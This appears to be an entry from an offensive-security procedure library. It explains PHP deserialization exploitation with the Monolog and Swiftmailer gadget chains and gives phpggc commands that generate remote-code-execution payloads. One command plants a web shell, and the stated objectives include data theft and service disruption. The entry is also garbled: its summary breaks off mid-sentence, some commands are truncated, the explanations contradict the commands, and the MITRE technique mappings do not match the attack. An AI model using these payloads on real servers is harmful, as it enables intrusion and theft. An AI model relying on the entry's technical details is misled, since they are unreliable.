---
id: d4e52a0f-6a11-4ac0-ba7e-80cfe993a50a
name: PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:59.407723+00:00'
updated_at: '2023-04-06T03:55:59.426038+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Regsvr32|T1117 - Regsvr32]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
- '[[Trusted Developer Utilities|T1127 - Trusted Developer Utilities]]'
- '[[XSL Script Processing|T1220 - XSL Script Processing]]'
tags:
- '[[Finding and using gadgets]]'
- '[[PHP Deserialization]]'
commands:
- '[[phpggc - Monolog RCE1]]'
---

# PHP Deserialization with Monolog/RCE1 and Swiftmailer/FW1 Gadgets

## Summary

PHP deserialization vulnerabilities can allow an attacker to execute arbitrary code on a server. The Monolog/RCE1 and Swiftmailer/FW1 gadgets are commonly used to exploit these vulnerabilities. Monolog is a PHP logging library that can be used to deserialize objects, while Swiftmailer is a library 

## Description

# Description

PHP deserialization vulnerabilities can allow an attacker to execute arbitrary code on a server. The Monolog/RCE1 and Swiftmailer/FW1 gadgets are commonly used to exploit these vulnerabilities. Monolog is a PHP logging library that can be used to deserialize objects, while Swiftmailer is a library for sending emails. Both libraries contain a gadget chain that can be used to execute arbitrary code. 

To exploit this vulnerability, the attacker will typically send a specially crafted serialized object to the target server. The object will contain the gadget chain, which will be deserialized by the vulnerable application. This will result in the execution of the attacker's payload. The attacker can use this technique to gain remote code execution on the server.

The business value of this technique is that it allows an attacker to gain unauthorized access to a server, which can lead to the theft of sensitive data, disruption of services, and other malicious activities.

 

## Requirements

1. Access to a vulnerable PHP application.

1. Knowledge of the Monolog/RCE1 or Swiftmailer/FW1 gadget chain.

1. Ability to send a specially crafted serialized object to the target server.

 

## Defense

1. Keep all software and libraries up to date to avoid known vulnerabilities.

1. Implement input validation and output encoding to prevent deserialization attacks.

1. Use a web application firewall (WAF) to detect and block malicious traffic.

 

## Objectives

1. To gain remote code execution on the target server.

1. To steal sensitive data from the target server.

1. To disrupt services on the target server.

 

# Instructions

1. Run the following command:

 



**Code**: [[phpggc monolog/rce1 'phpinfo();' -s]]



> This command uses the phpggc tool to generate a payload using the Monolog/RCE1 gadget. The payload will execute the `phpinfo()` function on the target server.

2. Run the following command:

 



**Code**: [[phpggc monolog/rce1 assert 'phpinfo()']]



> This command uses the phpggc tool to generate a payload using the Monolog/RCE1 gadget with the assert function. The payload will execute the `phpinfo()` function on the target server.



**Command** ([[phpggc - Monolog RCE1]]):

```bash
phpggc monolog/rce1 assert 'phpinfo()'
```



3. Run the following command:

 



**Code**: [[phpggc swiftmailer/fw1 /var/www/html/shell.php /tm]]



> This command uses the phpggc tool to generate a payload using the Swiftmailer/FW1 gadget. The payload will create a shell in the /tmp/data directory on the target server.

4. Run the following command:

 



**Code**: [[phpggc Monolog/RCE2 system 'id' -p phar -o /tmp/te]]



> This command uses the phpggc tool to generate a payload using the Monolog/RCE2 gadget. The payload will execute the `id` command on the target server and write the output to the /tmp/testinfo.ini file.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Regsvr32|T1117 - Regsvr32]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]
- [[Trusted Developer Utilities|T1127 - Trusted Developer Utilities]]
- [[XSL Script Processing|T1220 - XSL Script Processing]]

## Commands Used

- [[phpggc - Monolog RCE1]]

## Tags

- [[Finding and using gadgets]]
- [[PHP Deserialization]]


